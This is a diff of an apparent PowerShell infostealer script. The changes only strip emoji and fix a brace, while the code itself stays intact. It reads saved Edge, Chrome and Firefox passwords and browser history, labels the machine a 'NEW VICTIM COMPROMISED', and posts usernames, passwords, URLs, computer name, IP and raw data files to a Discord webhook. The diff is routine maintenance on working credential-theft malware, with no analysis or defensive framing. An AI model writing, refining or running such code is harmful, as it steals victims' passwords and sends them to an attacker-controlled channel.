@@ -28,9 +28,9 @@ $passwordCount = 0
 if (Test-Path "microsoft_edge_password.json") {
     $edgePass = Get-Content "microsoft_edge_password.json" | ConvertFrom-Json
     foreach ($cred in $edgePass) {
-        $formattedCreds += "🔷 **Edge** | ``$($cred.url)```n"
-        $formattedCreds += "   👤 User: ``$($cred.username)```n"
-        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
+        $formattedCreds += "[EDGE] | ``$($cred.url)```n"
+        $formattedCreds += "   User: ``$($cred.username)```n"
+        $formattedCreds += "   Pass: ``$($cred.password)```n`n"
         $passwordCount++
     }
 }
@@ -39,9 +39,9 @@ if (Test-Path "microsoft_edge_password.json") {
 if (Test-Path "chrome_password.json") {
     $chromePass = Get-Content "chrome_password.json" | ConvertFrom-Json
     foreach ($cred in $chromePass) {
-        $formattedCreds += "🔵 **Chrome** | ``$($cred.url)```n"
-        $formattedCreds += "   👤 User: ``$($cred.username)```n"
-        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
+        $formattedCreds += "[CHROME] | ``$($cred.url)```n"
+        $formattedCreds += "   User: ``$($cred.username)```n"
+        $formattedCreds += "   Pass: ``$($cred.password)```n`n"
         $passwordCount++
     }
 }
@@ -50,15 +50,15 @@ if (Test-Path "chrome_password.json") {
 if (Test-Path "firefox_password.json") {
     $ffPass = Get-Content "firefox_password.json" | ConvertFrom-Json
     foreach ($cred in $ffPass) {
-        $formattedCreds += "🦊 **Firefox** | ``$($cred.url)```n"
-        $formattedCreds += "   👤 User: ``$($cred.username)```n"
-        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
+        $formattedCreds += "[FIREFOX] | ``$($cred.url)```n"
+        $formattedCreds += "   User: ``$($cred.username)```n"
+        $formattedCreds += "   Pass: ``$($cred.password)```n`n"
         $passwordCount++
     }
 }
 
 if ($passwordCount -eq 0) {
-    $formattedCreds = "⚠️ No saved passwords found"
+    $formattedCreds = "No saved passwords found"
 }
 
 # Get history count
@@ -68,38 +68,38 @@ if (Test-Path "microsoft_edge_history.json") {
     $historyCount = $history.Count
 }
 
-# Send beautiful Discord embed
+# Send Discord embed
 $payload = @{
     embeds = @(
         @{
-            title = "🎯 NEW VICTIM COMPROMISED"
+            title = "NEW VICTIM COMPROMISED"
             color = 15158332
             fields = @(
                 @{
-                    name = "👤 Username"
+                    name = "Username"
                     value = "``$username``"
                     inline = $true
                 }
                 @{
-                    name = "🖥️ Computer"
+                    name = "Computer"
                     value = "``$computer``"
                     inline = $true
                 }
                 @{
-                    name = "🌐 IP Address"
+                    name = "IP Address"
                     value = "``$ip``"
                     inline = $false
                 }
                 @{
-                    name = "📊 Statistics"
-                    value = "🔑 **$passwordCount** passwords | 📜 **$historyCount** history items"
+                    name = "Statistics"
+                    value = "$passwordCount passwords | $historyCount history items"
                     inline = $false
                 }
             )
             timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
         },
         @{
-            title = "🔑 Stolen Credentials"
+            title = "Stolen Credentials"
             description = $formattedCreds
             color = 16776960
         }
@@ -116,12 +116,12 @@ foreach ($file in $files) {
     $content = Get-Content $file.FullName -Raw
     if ($content.Length -gt 10 -and $content.Length -lt 1800) {
         $msg = @{
-            content = "**📎 Raw Data: $($file.Name)**``````json`n$content``````"
+            content = "**Raw Data: $($file.Name)**``````json`n$content``````"
         } | ConvertTo-Json -Depth 10
         Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json; charset=utf-8'
         Start-Sleep -Seconds 1
     }
-}  # <-- ADDED THIS CLOSING BRACE
+}
 
 # Cleanup
 cd "$env:appdata"
